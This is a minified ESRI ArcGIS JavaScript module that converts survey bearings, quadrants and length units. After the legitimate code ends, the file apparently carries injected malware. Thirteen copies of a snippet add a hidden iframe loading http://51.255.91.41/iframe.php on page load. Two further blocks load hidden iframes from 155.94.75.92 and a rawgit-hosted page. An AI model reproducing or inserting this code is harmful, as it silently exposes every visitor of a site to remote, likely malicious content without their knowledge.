// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define([],function(){var d={bearingFieldPlaces:4,planSettingsOptions:{directionOrAngleType:["northAzimuth","southAzimuth","quadrantBearing"],directionOrAngleUnits:["decimalDegree","degreeMinuteSeconds"],distanceAndLengthUnits:["uSSurveyFeet","meters"],areaUnits:["squareUsFeet","acres","squareMeters"],circularCurveParameters:["radiusAndChordLength","radiusAndArcLength"]},getQuadrant:function(a){return{"-1":"NE","-2":"SE","-3":"SW","-4":"NW"}[a]},getQuadrantShortcut:function(a){a=a.toUpperCase();return{NE:"-1",
SE:"-2",SW:"-3",NW:"-4"}[a]},getQuadrantShortcutFromDD:function(a){var b;0<=a&&90>=a?b="-1":90<a&&180>=a?b="-2":180<a&&270>a?b="-3":270<=a&&360>a&&(b="-4");return b},getQuadrantAngleFromNADD:function(a){a=d.getQuadrantAngleAndShortcut(a);return a.quadrant.charAt(0)+a.quadrantAngle+a.quadrant.charAt(1)},getSouthAzimuthFromNorthAzimuth:function(a){var b;180<a?b=a-180:180>a?b=a+180:180===a&&(b=0);return b},DMStoDD:function(a){var b,c,d;b=Math.abs(parseFloat(a.degree));c=parseFloat(a.minutes);d=parseFloat(a.seconds);
b=b+c/60+d/3600;a.isNegative&&(b*=-1);return b},DDtoDMS:function(a){var b,c;b=3600*a.angle;a=Math.round(b%60);a=60==a?0:a;c=(b-a)/60;b=Math.round(c%60);b=60==b?0:b;return{degree:Math.round((c-b)/60),minutes:b,seconds:a}},getBearingObjForFormat0:function(a){var b,c;b={};b.degree=parseInt(a[1],10);b.minutes=parseInt(a[2]||0,10);b.seconds=parseInt(a[3]||0,10);b.quadrant=d.getQuadrant("-"+a[4]);b.quadrantShortcut="-"+a[4];"string"===typeof a[1]&&(c="-"===a[1].charAt(0));b.decimalDegrees=d.DMStoDD({degree:b.degree,
minutes:b.minutes,seconds:b.seconds,isNegative:c});return b},getBearingObjForFormat1:function(a){var b,c;b={};b.degree=parseInt(a[2],10);b.minutes=parseInt(a[3]||0,10);b.seconds=parseInt(a[4]||0,10);b.quadrant=a[1]+a[5];b.quadrantShortcut=d.getQuadrantShortcut(a[1]+a[5]);"string"===typeof a[2]&&(c="-"===a[2].charAt(0));b.decimalDegrees=d.DMStoDD({degree:b.degree,minutes:b.minutes,seconds:b.seconds,isNegative:c});return b},getBearingObjForFormat2:function(a){var b,c;b={};b.degree=parseInt(a[2],10);
b.minutes=parseInt(a[3]||0,10);b.seconds=parseInt(a[4]||0,10);b.quadrant=a[1]+a[5];b.quadrantShortcut=d.getQuadrantShortcut(a[1]+a[5]);"string"===typeof a[2]&&(c="-"===a[2].charAt(0));b.decimalDegrees=d.DMStoDD({degree:b.degree,minutes:b.minutes,seconds:b.seconds,isNegative:c});return b},getBearingObjForFormat3:function(a){var b,c;b={};b.degree=parseInt(a[1],10);b.minutes=parseInt(a[2]||0,10);b.seconds=parseInt(a[3]||0,10);"string"===typeof a[1]&&(c="-"===a[1].charAt(0));b.decimalDegrees=d.DMStoDD({degree:b.degree,
minutes:b.minutes,seconds:b.seconds,isNegative:c});b.quadrantShortcut=d.getQuadrantShortcutFromDD(b.decimalDegrees);b.quadrant=d.getQuadrant(b.quadrantShortcut);return b},getBearingObjForFormat4:function(a){var b,c;b=d.DDtoDMS({angle:a[1]});c={};c.degree=b.degree;c.minutes=b.minutes;c.seconds=b.seconds;c.decimalDegrees=a[1];c.quadrantShortcut=d.getQuadrantShortcutFromDD(c.decimalDegrees);c.quadrant=d.getQuadrant(c.quadrantShortcut);return c},getBearingObjForFormat5:function(a){var b,c;b={};b.degree=
parseInt(a[1],10);b.minutes=parseInt(a[2]||0,10);b.seconds=parseInt(a[3]||0,10);"string"===typeof a[1]&&(c="-"===a[1].charAt(0));b.decimalDegrees=d.DMStoDD({degree:b.degree,minutes:b.minutes,seconds:b.seconds,isNegative:c});b.quadrantShortcut=d.getQuadrantShortcutFromDD(b.decimalDegrees);b.quadrant=d.getQuadrant(b.quadrantShortcut);return b},getBearingObjForFormat6:function(a){var b,c;b={};b.degree=parseInt(a[1],10);b.minutes=parseInt(a[2]||0,10);b.seconds=parseInt(a[3]||0,10);b.quadrantShortcut=
a[4];b.quadrant=d.getQuadrant(b.quadrantShortcut);"string"===typeof a[1]&&(c="-"===a[1].charAt(0));b.decimalDegrees=d.DMStoDD({degree:b.degree,minutes:b.minutes,seconds:b.seconds,isNegative:c});return b},getBearingObjForFormat7:function(a){var b,c;b={};b.decimalDegrees=a[2];c=d.DDtoDMS({angle:b.decimalDegrees});b.degree=parseInt(c.degree,10);b.minutes=parseInt(c.minutes||0,10);b.seconds=parseInt(c.seconds||0,10);b.quadrant=a[1]+a[3];b.quadrantShortcut=d.getQuadrantShortcut(b.quadrant);return b},getBearingObjForFormat8:function(a){var b,
c;b={};b.decimalDegrees=a[1];c=d.DDtoDMS({angle:b.decimalDegrees});b.degree=parseInt(c.degree,10);b.minutes=parseInt(c.minutes||0,10);b.seconds=parseInt(c.seconds||0,10);b.quadrantShortcut=a[2];b.quadrant=d.getQuadrant(b.quadrantShortcut);return b},getQuadrantAngleAndShortcut:function(a){var b={};0<=a&&90>=a?(b.quadrantAngle=a,b.quadrant="NE"):90<a&&180>=a?(b.quadrantAngle=180-a,b.quadrant="SE"):180<a&&270>a?(b.quadrantAngle=a-180,b.quadrant="SW"):270<=a&&360>a&&(b.quadrantAngle=360-a,b.quadrant=
"NW");return b},roundSeconds:function(a){a=Number(a);return 10>a?"0"+a:a},honourPopupRounding:function(a,b){var c;if(isNaN(b))return b;if(isNaN(a)||null===a)a=4;c=Math.pow(10,a);b=Math.round(b*c)/c;b=b.toFixed(a);return parseFloat(b)},convertBearingToOutputFormats:function(a){var b,c,e,f,g;b={};c={};360===a.degree&&(a.degree=0);b=a.decimalDegrees;360===b&&(b=0);c.naDD=b;c.naDDRound=d.honourPopupRounding(d.bearingFieldPlaces,b);360===Number(c.naDDRound)&&(c.naDDRound=0);e=10>a.minutes?"0"+a.minutes:
a.minutes;f=a.seconds;0<Number(e)&&0<Number(d.roundSeconds(f))?c.naDMS=a.degree+"-"+e+"-"+d.roundSeconds(f):0===Number(e)&&0<Number(d.roundSeconds(f))?c.naDMS=a.degree+"-"+e+"-"+d.roundSeconds(f):0<Number(e)&&0===Number(d.roundSeconds(f))?c.naDMS=a.degree+"-"+e+"-00":0===Number(e)&&0===Number(d.roundSeconds(f))&&(c.naDMS=a.degree+"-00-00");a=d.getQuadrantAngleAndShortcut(b);c.qb3DD=a.quadrant.charAt(0)+a.quadrantAngle+a.quadrant.charAt(1);c.qb3DDRound=a.quadrant.charAt(0)+d.honourPopupRounding(d.bearingFieldPlaces,
a.quadrantAngle)+a.quadrant.charAt(1);e=d.DDtoDMS({angle:a.quadrantAngle});f=10>e.minutes?"0"+e.minutes:e.minutes;g=e.seconds;0<Number(f)&&0<Number(d.roundSeconds(g))?c.qb3DMS=a.quadrant.charAt(0)+e.degree+"-"+f+"-"+d.roundSeconds(g)+a.quadrant.charAt(1):0===Number(f)&&0<Number(d.roundSeconds(g))?c.qb3DMS=a.quadrant.charAt(0)+e.degree+"-"+f+"-"+d.roundSeconds(g)+a.quadrant.charAt(1):0<Number(f)&&0===Number(d.roundSeconds(g))?c.qb3DMS=a.quadrant.charAt(0)+e.degree+"-"+f+"-00"+a.quadrant.charAt(1):
0===Number(f)&&0===Number(d.roundSeconds(g))&&(c.qb3DMS=a.quadrant.charAt(0)+e.degree+"-00-00"+a.quadrant.charAt(1));b=d.getSouthAzimuthFromNorthAzimuth(b);360===b&&(b=0);c.saDD=b;c.saDDRound=d.honourPopupRounding(d.bearingFieldPlaces,b);360===Number(c.saDDRound)&&(c.saDDRound=0);b=d.DDtoDMS({angle:b});360===b.degree&&(b.degree=0);a=10>b.minutes?"0"+b.minutes:b.minutes;e=b.seconds;0<Number(a)&&0<Number(d.roundSeconds(e))?c.saDMS=b.degree+"-"+a+"-"+d.roundSeconds(e):0===Number(a)&&0<Number(d.roundSeconds(e))?
c.saDMS=b.degree+"-"+a+"-"+d.roundSeconds(e):0<Number(a)&&0===Number(d.roundSeconds(e))?c.saDMS=b.degree+"-"+a+"-00":0===Number(a)&&0===Number(d.roundSeconds(e))&&(c.saDMS=b.degree+"-00-00");return c},getBearingDetailsOfRequiredFormat:function(a,b){var c={};switch(b){case 0:c=d.getBearingObjForFormat0(a);break;case 1:c=d.getBearingObjForFormat1(a);break;case 2:c=d.getBearingObjForFormat2(a);break;case 3:c=d.getBearingObjForFormat3(a);break;case 4:c=d.getBearingObjForFormat4(a);break;case 5:c=d.getBearingObjForFormat5(a);
break;case 6:c=d.getBearingObjForFormat6(a);break;case 7:c=d.getBearingObjForFormat7(a);break;case 8:c=d.getBearingObjForFormat8(a)}return d.convertBearingToOutputFormats(c)},getBearingFormatArr:function(){var a=[];a.push({regex:/^((?:\-)?(?:3[0-5]\d|[12]\d{2}|[1-9]\d?|0))(?:\-(0|[0-5]?\d)\-(0|[0-5]\d))?\-([1-4])$/,type:"degreeMinuteSeconds"});a.push({regex:/^([nNsS])((?:\-)?(?:3[0-5]\d|[12]\d{2}|[1-9]\d?|0))(?:\-(0|[0-5]?\d)\-(0|[0-5]\d))?([eEwW])$/,type:"degreeMinuteSeconds"});a.push({regex:/^([nNsS])((?:\-)?(?:3[0-5]\d|[12]\d{2}|[1-9]\d?|0))(?:\.([0-5]\d)(?:([0-5]\d))?)?([eEwW])$/,
type:"degreeMinuteSeconds"});a.push({regex:/^((?:\-)?(?:3[0-5]\d|[12]\d{2}|[1-9]\d?|0))(?:\.([0-5]\d)(?:([0-5]\d))?)?$/,type:"degreeMinuteSeconds"});a.push({regex:/^((?:(?:\-?)(?:3[0-5]\d|[12]\d{2}|[1-9]\d?|0)(?:\.\d+)?)|(?:\-?)(?:\.\d+))$/,type:"decimalDegree"});a.push({regex:/^((?:\-)?(?:3[0-5]\d|[12]\d{2}|[1-9]\d?|0))(?:\-(0|[0-5]?\d)\-((?:[0-5]\d)))?$/,type:"degreeMinuteSeconds"});a.push({regex:/^((?:\-)?(?:3[0-5]\d|[12]\d{2}|[1-9]\d?|0))(?:\.([0-5]\d)(?:([0-5]\d))?)?(\-[1-4])$/,type:"degreeMinuteSeconds"});
a.push({regex:/^([nNsS])((?:(?:\-?)(?:3[0-5]\d|[12]\d{2}|[1-9]\d?|0)(?:\.\d+)?)|(?:\-?)(?:\.\d+))([eEwW])$/,type:"decimalDegree"});a.push({regex:/^((?:(?:\-?)(?:3[0-5]\d|[12]\d{2}|[1-9]\d?|0)(?:\.\d+)?)|(?:\-?)(?:\.\d+))(\-[1-4])$/,type:"decimalDegree"});return a},getNorthAzimuthAngle:function(a,b){b=b.toUpperCase();a=Number(a);switch(b){case "-1":case "NE":return(a+360)%360;case "-2":case "SE":return(540-a)%360;case "-3":case "SW":return(540+a)%360;case "-4":case "NW":return(360-a)%360}},convertBearingToNorthAzimuth:function(a,
b,c){switch(b){case 0:b=d.getBearingObjForFormat0(a);b=d.getNorthAzimuthAngle(b.decimalDegrees,"-"+a[4]);b=d.DDtoDMS({angle:b});a[1]=b.degree;a[2]=b.minutes;a[3]=b.seconds;break;case 1:b=d.getBearingObjForFormat1(a);b=d.getNorthAzimuthAngle(b.decimalDegrees,a[1]+a[5]);b=d.DDtoDMS({angle:b});a[2]=b.degree;a[3]=b.minutes;a[4]=b.seconds;break;case 2:b=d.getBearingObjForFormat2(a);b=d.getNorthAzimuthAngle(b.decimalDegrees,a[1]+a[5]);b=d.DDtoDMS({angle:b});a[2]=b.degree;a[3]=b.minutes;a[4]=b.seconds;break;
case 3:"northAzimuth"===c.directionOrAngleType||"quadrantBearing"===c.directionOrAngleType?(b=d.getBearingObjForFormat3(a),b=d.getNorthAzimuthAngle(b.decimalDegrees,"-1"),b=d.DDtoDMS({angle:b}),a[1]=b.degree,a[2]=b.minutes,a[3]=b.seconds):"southAzimuth"===c.directionOrAngleType&&(b=d.getBearingObjForFormat3(a),b=d.getNorthAzimuthAngle(b.decimalDegrees,"-3"),b=d.DDtoDMS({angle:b}),a[1]=b.degree,a[2]=b.minutes,a[3]=b.seconds);break;case 4:"northAzimuth"===c.directionOrAngleType||"quadrantBearing"===
c.directionOrAngleType?a[1]=d.getNorthAzimuthAngle(a[1],"-1"):"southAzimuth"===c.directionOrAngleType&&(a[1]=d.getNorthAzimuthAngle(a[1],"-3"));break;case 5:"northAzimuth"===c.directionOrAngleType?(b=d.getBearingObjForFormat5(a),b=d.getNorthAzimuthAngle(b.decimalDegrees,"-1"),b=d.DDtoDMS({angle:b}),a[1]=b.degree,a[2]=b.minutes,a[3]=b.seconds):"southAzimuth"===c.directionOrAngleType?(b=d.getBearingObjForFormat5(a),b=d.getNorthAzimuthAngle(b.decimalDegrees,"-3"),b=d.DDtoDMS({angle:b}),a[1]=b.degree,
a[2]=b.minutes,a[3]=b.seconds):"quadrantBearing"===c.directionOrAngleType&&(a=null);break;case 6:b=d.getBearingObjForFormat6(a);b=d.getNorthAzimuthAngle(b.decimalDegrees,a[4]);b=d.DDtoDMS({angle:b});a[1]=b.degree;a[2]=b.minutes;a[3]=b.seconds;break;case 7:a[2]=d.getNorthAzimuthAngle(a[2],a[1]+a[3]);break;case 8:a[1]=d.getNorthAzimuthAngle(a[1],a[2])}return a},categorizeBearingFormat:function(a,b){var c,e,f;a=a.toString();c=d.getBearingFormatArr();for(f=0;f<c.length;f++)if(c[f].type===b.directionOrAngleUnits&&
(e=c[f].regex.exec(a.trim()))&&0<e.length){e=d.convertBearingToNorthAzimuth(e,f,b);break}if(!e)for(f=0;f<c.length;f++)if(c[f].type!==b.directionOrAngleUnits&&(e=c[f].regex.exec(a.trim()))&&0<e.length){e=d.convertBearingToNorthAzimuth(e,f,b);break}return e?d.getBearingDetailsOfRequiredFormat(e,f):null},metersToUSSurveyFeet:function(a){a=Number(a);return 3.28083333333*a},usSurveyFeetToMeters:function(a){a=Number(a);return.304800609601*a},feetToUSSurveyFeet:function(a){a=Number(a);return d.metersToUSSurveyFeet(.3048*
a)},feetToMeters:function(a){a=Number(a);return.3048*a},usSurveyFeetToFeet:function(a){a=Number(a);return 1.000001999999281*a},metersToFeet:function(a){a=Number(a);return 3.280839895*a},acresToSquareKilometer:function(a){a=Number(a);return.00404686*a},milesToKilometer:function(a){a=Number(a);return 1.60934*a},getLengthObjForFormat0:function(a,b){var c;c={};"uSSurveyFeet"===b?(c.uSSurveyFeet=Number(a[0]),c.uSSurveyFeetRound=Math.round(1E4*c.uSSurveyFeet)/1E4,c.meters=d.usSurveyFeetToMeters(a[0]),c.metersRound=
Math.round(1E4*c.meters)/1E4,c.feet=d.usSurveyFeetToFeet(c.uSSurveyFeet),c.feetRound=Math.round(1E4*c.feet)/1E4):"meters"===b&&(c.uSSurveyFeet=d.metersToUSSurveyFeet(a[0]),c.uSSurveyFeetRound=Math.round(1E4*c.uSSurveyFeet)/1E4,c.meters=Number(a[0]),c.metersRound=Math.round(1E4*c.meters)/1E4,c.feet=d.metersToFeet(c.meters),c.feetRound=Math.round(1E4*c.feet)/1E4);return c},getLengthObjForFormat1:function(a){var b;b={};b.uSSurveyFeet=Number(a[2]);b.uSSurveyFeetRound=Math.round(1E4*b.uSSurveyFeet)/1E4;
b.meters=d.usSurveyFeetToMeters(a[2]);b.metersRound=Math.round(1E4*b.meters)/1E4;b.feet=d.usSurveyFeetToFeet(b.uSSurveyFeet);b.feetRound=Math.round(1E4*b.feet)/1E4;return b},getLengthObjForFormat2:function(a){var b;b={};b.uSSurveyFeet=d.metersToUSSurveyFeet(a[2]);b.uSSurveyFeetRound=Math.round(1E4*b.uSSurveyFeet)/1E4;b.meters=Number(a[2]);b.metersRound=Math.round(1E4*b.meters)/1E4;b.feet=d.metersToFeet(b.meters);b.feetRound=Math.round(1E4*b.feet)/1E4;return b},getLengthObjForFormat3:function(a){var b;
b={};b.uSSurveyFeet=d.feetToUSSurveyFeet(a[2]);b.uSSurveyFeetRound=Math.round(1E4*b.uSSurveyFeet)/1E4;b.meters=d.feetToMeters(a[2]);b.metersRound=Math.round(1E4*b.meters)/1E4;b.feet=Number(a[2]);b.feetRound=Math.round(1E4*b.feet)/1E4;return b},categorizeLengthFormat:function(a,b){var c,e,f;c=[];a=a.toString();c.push(/^((\-?)((0?|([1-9]\d*))(\.\d+)?))$/);c.push(/^(((\-?)((0?|([1-9]\d*))(\.\d+)?))(ft|FT|fT|Ft))$/);c.push(/^(((\-?)((0?|([1-9]\d*))(\.\d+)?))(m|M))$/);for(f=0;f<c.length&&!((e=c[f].exec(a.trim()))&&
0<e.length);f++);e?(a=d.getLengthOfRequiredFormat(e,f,b))&&isNaN(a.meters)&&(a=null):a=null;return a},categorizeLengthFormatForFeet:function(a){var b,c,e;b=[];a=a.toString();b.push(/^((\-?)((0?|([1-9]\d*))(\.\d+)?))$/);for(e=0;e<b.length&&!((c=b[e].exec(a.trim()))&&0<c.length);e++);return c?d.getLengthObjForFormat3(c):null},getLengthOfRequiredFormat:function(a,b,c){var e={};switch(b){case 0:e=d.getLengthObjForFormat0(a,c);break;case 1:e=d.getLengthObjForFormat1(a);break;case 2:e=d.getLengthObjForFormat2(a)}return e}};
return d});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});